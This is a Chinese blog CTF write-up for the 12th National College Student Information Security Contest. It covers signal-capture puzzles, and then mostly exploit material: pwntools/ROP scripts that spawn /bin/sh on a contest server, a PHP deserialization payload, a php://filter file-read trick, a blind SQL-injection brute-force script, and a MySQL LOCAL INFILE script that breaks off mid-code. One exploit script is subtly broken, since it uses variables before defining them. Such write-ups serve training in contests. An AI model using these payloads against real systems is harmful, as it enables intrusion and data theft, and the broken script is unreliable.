<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>第十二届全国大学生信息安全竞赛线上赛wp | Damya&#39;s Blog | あややこやや</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="团队ctf竞赛">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Damya</h5>
          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
            
              <span>3</span>
            
              <span>9</span>
            
              <span>7</span>
            
              <span>5</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/DamyaHome" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>第十二届全国大学生信息安全竞赛线上赛wp</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">第十二届全国大学生信息安全竞赛线上赛wp</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-09-27T12:25:48.000Z" itemprop="datePublished" class="page-time">
  2019-09-27
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-第十二届全国大学生信息安全竞赛线上赛wp"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">第十二届全国大学生信息安全竞赛线上赛wp</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-09-27 20:25:48" datetime="2019-09-27T12:25:48.000Z"  itemprop="datePublished">2019-09-27</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="防灾科技学院G1nkGioy战队"><a href="#防灾科技学院G1nkGioy战队" class="headerlink" title="防灾科技学院G1nkGioy战队"></a>防灾科技学院G1nkGioy战队</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01  签到"></a>0x01  签到</h3><p>只要有三个人就可以出现flag<br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
                <p>图片</p>
            </figure><br>flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d}</p>
<h3 id="0x02-saleae"><a href="#0x02-saleae" class="headerlink" title="0x02  saleae"></a>0x02  saleae</h3><p>根据提示需要软件saleae logic 1.2.17<br>看到三道信号输入  用spi分析  调参数   读出flag<br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./6.png" title="图片](./3.png)![图片](./4.png)![图片](./5.png)![图片" data-fancybox="images"><img src="./6.png" alt="图片](./3.png)![图片](./4.png)![图片](./5.png)![图片" title class></a>
                <p>图片](./3.png)![图片](./4.png)![图片](./5.png)![图片</p>
            </figure><br>flag{12071397-19d1-48e6-be8c-784b89a95e07}</p>
<h3 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03  24c"></a>0x03  24c</h3><p>analyzers  12c 分析   用到12c总线通信<br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./10.png" title="图片](./7.png)![图片](./8.png)![图片](./9.png)![图片" data-fancybox="images"><img src="./10.png" alt="图片](./7.png)![图片](./8.png)![图片](./9.png)![图片" title class></a>
                <p>图片](./7.png)![图片](./8.png)![图片](./9.png)![图片</p>
            </figure><br>提取文字  flag{c46d9e10-e9b5-4d90-a883-41cf163bdf4e}<br>根据头尾的setup write to …和NAK结束符，进行拼接<br>头部的’ ‘ + 尾部的\t  从头跳过前九位（空格）开始写入，ac替换9e<br>flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}</p>
<h3 id="0x04-usbasp"><a href="#0x04-usbasp" class="headerlink" title="0x04  usbasp"></a>0x04  usbasp</h3><p>看到三道通信  用spi 分析  调参数得到flag<br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
                <p>图片</p>
            </figure></p>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./14.png" title="图片](./12.png)![图片](./13.png)![图片" data-fancybox="images"><img src="./14.png" alt="图片](./12.png)![图片](./13.png)![图片" title class></a>
                <p>图片](./12.png)![图片](./13.png)![图片</p>
            </figure>
<p>flag{85b084c6-42e6-495c-87b4-46dfb1df58a0}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x01-your-pwn"><a href="#0x01-your-pwn" class="headerlink" title="0x01  your_pwn"></a>0x01  your_pwn</h3><p>利用read函数获取栈上libc_start地址，通过在线查询获取libc版本，下载对应版本libc库读取system函数偏移地址，再将该地址覆盖至栈上返回地址。<br>由于是64位，参数放在栈上，所以要先将bin/sh字符串地址写到栈上，再通过ROPgadget找到pop rdi的位置，先调用该处函数将sh字符串地址存入rdi，再调用system函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;)</span><br><span class="line">r = process(&apos;./pwn&apos;)</span><br><span class="line">libc = elf(&apos;./libc.so&apos;)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(&quot;abcdefg&quot;)</span><br><span class="line">array = [&apos;0&apos; for i in range(6)]</span><br><span class="line">n = 632</span><br><span class="line">i = 0</span><br><span class="line">while(i &lt; 6):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n + i))</span><br><span class="line">	r.recvuntil(&quot;now value(hex) &quot;)</span><br><span class="line">	tmp = r.recv(2).decode(&apos;utf-8&apos;)</span><br><span class="line">	tmp2[i] = tmp</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	r.sendline(str(int(tmp, 16)))</span><br><span class="line">	i += 1</span><br><span class="line">str1 = &quot;&quot;</span><br><span class="line">for i in range(6):</span><br><span class="line">	str1 += array[i]</span><br><span class="line">addr = int(str1, 16)</span><br><span class="line">libc_base = addr - addr2</span><br><span class="line">obj = LibcSearcher(&quot;__libc_start_main_ret&quot;, addr)</span><br><span class="line">addr2 = libc.symbol(b&quot;__libc_start_main_ret&quot;)</span><br><span class="line">sh_addr = libc.symbol(b&quot;str_bin_sh&quot;) + libc_base</span><br><span class="line">system_addr = libc.symbol(b&quot;system&quot;) + libc_base</span><br><span class="line">sh_addrstr = hex(sh_addr)</span><br><span class="line">system_addrstr = hex(system_addr)</span><br><span class="line">n = 344</span><br><span class="line">array = [&apos;0&apos; for i in range(6)]</span><br><span class="line">i = 0</span><br><span class="line">while(i &lt; 6):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n + i));</span><br><span class="line">	r.recvuntil(&quot;now value(hex) &quot;)</span><br><span class="line">	tmp = r.recv(2).decode(&apos;utf-8&apos;)</span><br><span class="line">	tmp2[i] = tmp</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	r.sendline(str(int(tmp, 16)))</span><br><span class="line">	i += 1</span><br><span class="line">str1 = &quot;&quot;</span><br><span class="line">for i in range(6):</span><br><span class="line">	str1 += array[i]</span><br><span class="line">return_addr = int(str1, 16)</span><br><span class="line">pop_addr = return_addr + 498</span><br><span class="line">str_pop_addr = hex(pop_addr)</span><br><span class="line">#pop rdi retn</span><br><span class="line">n = 344</span><br><span class="line">r.recvuntil(&quot;input index&quot;)</span><br><span class="line">r.sendline(str(n))</span><br><span class="line">r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">tmp = str_pop_addr[12] + str_pop_addr[13]</span><br><span class="line">r.sendline(str(int(tmp, 16)))</span><br><span class="line">r.recvuntil(&quot;input index&quot;)</span><br><span class="line">r.sendline(str(n+1))</span><br><span class="line">r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">tmp = str_pop_addr[10] + str_pop_addr[11]</span><br><span class="line">r.sendline(str(int(tmp, 16)))</span><br><span class="line">n = 352</span><br><span class="line">for i in range(8):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n + i + 1))</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	if(i &gt;= 5):</span><br><span class="line">		r.sendline(&quot;0&quot;)</span><br><span class="line">	else:</span><br><span class="line">		r.sendline(str(int(sh_addrstr[13-2*i-1] + sh_addrstr[14-2*i-1], 16)))</span><br><span class="line">n = 360</span><br><span class="line">for i in range(6):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n+i+1))</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	print(system_addrstr)</span><br><span class="line">	r.sendline(str(int(system_addrstr[2*(6-i)] + system_addrstr[2*(6-i) + 1], 16)))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p> flag{9e86b13d6003427e1e63938f740e4c28} </p>
<h3 id="0x02-baby-pwn"><a href="#0x02-baby-pwn" class="headerlink" title="0x02  baby_pwn"></a>0x02  baby_pwn</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line"></span><br><span class="line">def rop(path,offset,sock):</span><br><span class="line">	rop = ROP(path)</span><br><span class="line">	addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line">	buf = rop.retfill(offset)</span><br><span class="line">	buf += rop.call(&apos;read&apos;, 0, addr_bss, 100)</span><br><span class="line">	buf += rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">	p = Proc(rop.path)</span><br><span class="line">	sock.sendall(p32(len(buf)) + buf+&apos;\n&apos;)</span><br><span class="line">	buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">	buf += rop.fill(20, buf)</span><br><span class="line">	buf += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">	buf += rop.fill(100, buf)</span><br><span class="line">	return buf</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	s.connect((&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,33865))</span><br><span class="line">	path=&apos;./pwn&apos;</span><br><span class="line">	ofs = 44</span><br><span class="line">	b = rop(path,ofs,s)</span><br><span class="line">	s.sendall(b)</span><br><span class="line">	tel = telnetlib.Telnet() </span><br><span class="line">	tel.sock = s</span><br><span class="line">	tel.interact()</span><br><span class="line"></span><br><span class="line">if &apos;__main__&apos; == __name__:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{3d08dff876024b6cf1bc938f4a46e5ef}</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x01-justsoso"><a href="#0x01-justsoso" class="headerlink" title="0x01  justsoso"></a>0x01  justsoso</h3><p>使用?file=php://filter/read=convert.base64-encode/resource=index.php读取index.php<br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./31.png" title="图片" data-fancybox="images"><img src="./31.png" alt="图片" title class></a>
                <p>图片</p>
            </figure></p>
<blockquote>
<p>PGh0bWw+DQo8P3BocA0KZXJyb3JfcmVwb3J0aW5nKDApOyANCiRmaWxlID0gJF9HRVRbImZpbGUiXTsgDQokcGF5bG9hZCA9ICRfR0VUWyJwYXlsb2FkIl07DQppZighaXNzZXQoJGZpbGUpKXsNCgllY2hvICdNaXNzaW5nIHBhcmFtZXRlcicuJzxicj4nOw0KfQ0KaWYocHJlZ19tYXRjaCgiL2ZsYWcvIiwkZmlsZSkpew0KCWRpZSgnaGFjayBhdHRhY2tlZCEhIScpOw0KfQ0KQGluY2x1ZGUoJGZpbGUpOw0KaWYoaXNzZXQoJHBheWxvYWQpKXsgIA0KICAgICR1cmwgPSBwYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOw0KICAgIHBhcnNlX3N0cigkdXJsWydxdWVyeSddLCRxdWVyeSk7DQogICAgZm9yZWFjaCgkcXVlcnkgYXMgJHZhbHVlKXsNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9mbGFnLyIsJHZhbHVlKSkgeyANCiAgICAJICAgIGRpZSgnc3RvcCBoYWNraW5nIScpOw0KICAgIAkgICAgZXhpdCgpOw0KICAgICAgICB9DQogICAgfQ0KICAgICRwYXlsb2FkID0gdW5zZXJpYWxpemUoJHBheWxvYWQpOw0KfWVsc2V7IA0KICAgZWNobyAiTWlzc2luZyBwYXJhbWV0ZXJzIjsgDQp9IA0KPz4NCjwhLS1QbGVhc2UgdGVzdCBpbmRleC5waHA/ZmlsZT14eHgucGhwIC0tPg0KPCEtLVBsZWFzZSBnZXQgdGhlIHNvdXJjZSBvZiBoaW50LnBocC0tPg0KPC9odG1sPg==Missing parameters</p>
</blockquote>
<p>base64解码找到php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); </span><br><span class="line">$file = $_GET[&quot;file&quot;]; </span><br><span class="line">$payload = $_GET[&quot;payload&quot;];</span><br><span class="line">if(!isset($file))&#123;</span><br><span class="line">	echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">	die(&apos;hack attacked!!!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">if(isset($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    parse_str($url[&apos;query&apos;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        if (preg_match(&quot;/flag/&quot;,$value)) &#123; </span><br><span class="line">    	    die(&apos;stop hacking!&apos;);</span><br><span class="line">    	    exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;else&#123; </span><br><span class="line">   echo &quot;Missing parameters&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>根据提示使用?file=php://filter/read=convert.base64-encode/resource=hint.php<br>读取hint.php</p>
<blockquote>
<p>PD9waHAgIA0KY2xhc3MgSGFuZGxleyANCiAgICBwcml2YXRlICRoYW5kbGU7ICANCiAgICBwdWJsaWMgZnVuY3Rpb24gX193YWtldXAoKXsNCgkJZm9yZWFjaChnZXRfb2JqZWN0X3ZhcnMoJHRoaXMpIGFzICRrID0+ICR2KSB7DQogICAgICAgICAgICAkdGhpcy0+JGsgPSBudWxsOw0KICAgICAgICB9DQogICAgICAgIGVjaG8gIldha2luZyB1cFxuIjsNCiAgICB9DQoJcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRoYW5kbGUpIHsgDQogICAgICAgICR0aGlzLT5oYW5kbGUgPSAkaGFuZGxlOyANCiAgICB9IA0KCXB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCl7DQoJCSR0aGlzLT5oYW5kbGUtPmdldEZsYWcoKTsNCgl9DQp9DQoNCmNsYXNzIEZsYWd7DQogICAgcHVibGljICRmaWxlOw0KICAgIHB1YmxpYyAkdG9rZW47DQogICAgcHVibGljICR0b2tlbl9mbGFnOw0KIA0KICAgIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRmaWxlKXsNCgkJJHRoaXMtPmZpbGUgPSAkZmlsZTsNCgkJJHRoaXMtPnRva2VuX2ZsYWcgPSAkdGhpcy0+dG9rZW4gPSBtZDUocmFuZCgxLDEwMDAwKSk7DQogICAgfQ0KICAgIA0KCXB1YmxpYyBmdW5jdGlvbiBnZXRGbGFnKCl7DQoJCSR0aGlzLT50b2tlbl9mbGFnID0gbWQ1KHJhbmQoMSwxMDAwMCkpOw0KICAgICAgICBpZigkdGhpcy0+dG9rZW4gPT09ICR0aGlzLT50b2tlbl9mbGFnKQ0KCQl7DQoJCQlpZihpc3NldCgkdGhpcy0+ZmlsZSkpew0KCQkJCWVjaG8gQGhpZ2hsaWdodF9maWxlKCR0aGlzLT5maWxlLHRydWUpOyANCiAgICAgICAgICAgIH0gIA0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4=</p>
</blockquote>
<p>在线解码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Handle&#123; </span><br><span class="line">    private $handle;  </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">		foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k = null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking up\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">	public function __construct($handle) &#123; </span><br><span class="line">        $this-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		$this-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line"> </span><br><span class="line">    function __construct($file)&#123;</span><br><span class="line">		$this-&gt;file = $file;</span><br><span class="line">		$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	public function getFlag()&#123;</span><br><span class="line">		$this-&gt;token_flag = md5(rand(1,10000));</span><br><span class="line">        if($this-&gt;token === $this-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			if(isset($this-&gt;file))&#123;</span><br><span class="line">				echo @highlight_file($this-&gt;file,true); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>分析源码，初步认为是序列化漏洞，构造payload，我们发现用///可以绕过parse_str($url[‘query’],$query);<br>其中R是PointRepresentation<br>handle是受保护成员变量含有\0和*需要URL编码一下，然后检测到进入到__wakeup函数中，发现思路是对的。从而构建以下payload</p>
<blockquote>
<p>///?file=hint.php&amp;payload=O:6:”Handle”:2:{s:14:”%00Handle%00handle”;O:4:”Flag”:3:{s:4:”file”;s:8:”flag.php”;s:5:”token”;N;s:10:”token_flag”;R:4;}}}得到flag</p>
</blockquote>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./16.png" title="图片" data-fancybox="images"><img src="./16.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>参考文献：<a href="https://www.jianshu.com/p/be6de8511cb9" target="_blank" rel="noopener">https://www.jianshu.com/p/be6de8511cb9</a></p>
<h3 id="0x02-全宇宙最简单的sql"><a href="#0x02-全宇宙最简单的sql" class="headerlink" title="0x02  全宇宙最简单的sql"></a>0x02  全宇宙最简单的sql</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=&quot;http://39.97.167.120:52105/&quot;</span><br><span class="line">c=&apos;&apos;</span><br><span class="line">for i in range(1,26):</span><br><span class="line">  for j in range(30,127):</span><br><span class="line">    data=&#123;</span><br><span class="line">      &apos;username&apos;:&quot;ciscn&apos;^1 and  (select ascii(mid((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1),%d,1))=%d from user) and pow(2,2222222)-- &quot;%(i,j),</span><br><span class="line">      &apos;password&apos;:&apos;1111&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    # print data</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    # print r.content</span><br><span class="line">    if &quot;数据库操作失败&quot; in r.content:</span><br><span class="line">      c=c+chr(j)</span><br><span class="line">      print c</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./17.png" title="图片" data-fancybox="images"><img src="./17.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>得到一串字符：F1AG@1s-at_/fll1llag_h3r3<br>但是不是flag，他的意思是，flag在根目录/fll1llag_h3r3<br>查找资料得知可能需要利用MySQL LOCAL INFILE来读取客户端文件<br>通过服务端和客户端连接的握手，发送数据，从而得到文件，和前几天的DDCTF一样，又知道文件名和路径。<br>根据参考网站，直接在服务器上运行脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 